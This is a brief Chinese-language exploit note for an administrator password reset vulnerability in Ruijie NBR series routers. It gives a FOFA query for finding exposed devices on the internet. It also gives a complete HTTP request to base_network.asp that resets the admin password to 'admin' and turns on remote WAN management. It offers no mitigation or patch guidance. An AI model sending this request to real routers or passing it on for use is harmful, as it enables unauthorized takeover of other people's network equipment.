## 锐捷NBR系列路由器存在管理员密码重置漏洞

锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。

锐捷NBR系列多款路由器`base_network.asp`存在管理员密码重置漏洞，攻击者通过漏洞重置密码登录后台

## fofa

```
body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"
```

## poc

```
GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admin&_= HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=
Connection: close
```

重置密码为admin

使用admin/admin登录系统